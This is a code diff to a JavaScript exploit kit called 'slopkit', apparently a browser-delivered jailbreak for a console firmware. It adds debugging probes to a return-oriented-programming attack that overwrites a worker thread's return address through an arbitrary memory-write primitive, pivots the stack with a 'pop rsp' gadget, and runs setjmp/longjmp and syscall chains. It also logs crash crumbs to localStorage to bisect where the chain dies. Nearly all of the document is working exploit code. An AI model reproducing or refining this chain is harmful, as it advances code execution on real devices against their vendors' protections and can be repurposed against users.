@@ -179,6 +179,14 @@ function jbmark(tag, detail) {
    log ending at MODULE-BASES. localStorage is the only thing that outlives the
    process, so commit a marker BEFORE each irreversible step and read the trail
    back on the next load -- the last crumb written is where it died. */
+/* ?probe=pivot | ?probe=null -- bisect the chain launch.
+   The trail says we die AFTER postMessage, i.e. the worker really does return
+   through the hijacked frame and control reaches our gadgets; something in the
+   chain then kills it. These two probes split that span in half. */
+let PROBE = (function () {
+    try { return new URLSearchParams(location.search).get("probe") || ""; }
+    catch (e) { return ""; }
+})();
 const CRUMB_KEY = "slopkit-crumbs";
 function crumb(tag) {
     try {
@@ -199,8 +207,25 @@ async function prepare(p) {
     const prevCrumbs = crumbsTake();
     if (prevCrumbs) {
         const parts = prevCrumbs.split(">");
+        const last = parts[parts.length - 1];
         jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-5).reverse().join(" <= ")
             + " (" + parts.length + " steps)");
+        /* Self-sequencing bisect. renderNav() is stubbed in this build, so the
+           console has no way to reach a ?probe= URL -- escalate automatically
+           on the run after a crash instead, driven by where the last one died. */
+        if (!PROBE && last === "nc") {
+            PROBE = "pivot";
+            jbmark("PROBE-AUTO", "the empty chain died, so setjmp/longjmp or the"
+                + " pivot itself is at fault, not the syscall stub"
+                + " -- escalating to probe=pivot this run");
+        } else if (!PROBE && last.indexOf("probe-pivot") === 0) {
+            jbmark("PROBE-VERDICT", "the previous run died at '" + last
+                + "', i.e. the WORKER CRASHED with only a `jmp $` written into"
+                + " the return slot. Nothing of ours executed but that one"
+                + " store, so the hijacked slot is not a live return address"
+                + " for this frame -- the frame choice is wrong, not the chain."
+                + " Re-rank OFFSET_lk_worker_wait_return (0x39843 / 0x33d1e).");
+        }
     }
     crumb("prep");
 
@@ -731,6 +756,33 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        if (PROBE === "pivot") {
+            /* Write a `jmp $` instead of the pivot and change nothing else.
+               If the worker then goes quiet WITHOUT crashing, the hijacked
+               return address is genuinely executed -- the frame, the slot and
+               the wake path are all correct, and the fault is purely in what
+               the chain does next. If it crashes anyway, the hijack itself is
+               wrong and no amount of chain fixing will help.
+               The worker is left spinning; this run ends here by design. */
+            crumb("probe-pivot-w1");
+            p.write8(return_address_ptr, gadgets["infloop"]);
+            crumb("probe-pivot-armed");
+            const answered = await new Promise((resolve) => {
+                const t = setTimeout(() => resolve(false), 6000);
+                worker.onmessage = function () { clearTimeout(t); resolve(true); };
+                crumb("probe-pivot-pm");
+                worker.postMessage(0);
+            });
+            crumb("probe-pivot-" + (answered ? "ANSWERED" : "SILENT"));
+            throw new Error("probe=pivot: worker "
+                + (answered ? "ANSWERED -- the return slot was NOT taken, the"
+                    + " hijack did not land (wrong frame or the write was undone)"
+                    : "went SILENT and did not crash -- the hijacked return"
+                    + " address IS executed, so the pivot is sound and the fault"
+                    + " is in the chain body")
+                + ". The worker is now spinning in infloop; reload.");
+        }
+
         crumb("w1");
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         crumb("w2");
@@ -787,6 +839,17 @@ async function prepare(p) {
     jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
         + "-poisoned-next=chain.syscall(SYS_GETPID)");
 
+    /* Empty chain first: a fresh worker_rop already carries pre_chain (setjmp),
+       and run() appends launch_chain's three restore-writes plus longjmp. So
+       this exercises the pivot, setjmp, `pop rdi`, `pop rsi`, `mov [rdi],rsi`
+       and longjmp -- everything the getpid chain uses EXCEPT the syscall stub.
+       Survive this and the fault is the stub; die here and it is the pivot or
+       the setjmp/longjmp round trip. Costs one extra round trip. */
+    crumb("nc");
+    await chain.run();
+    crumb("nc-ok");
+    jbmark("PREP-NULLCHAIN-OK", "pivot+setjmp+longjmp round trip survived");
+
     crumb("gp-call");
     let pid = await chain.syscall(SYS_GETPID);
     crumb("gp-ret");
@@ -812,4 +875,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=23`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=24`);
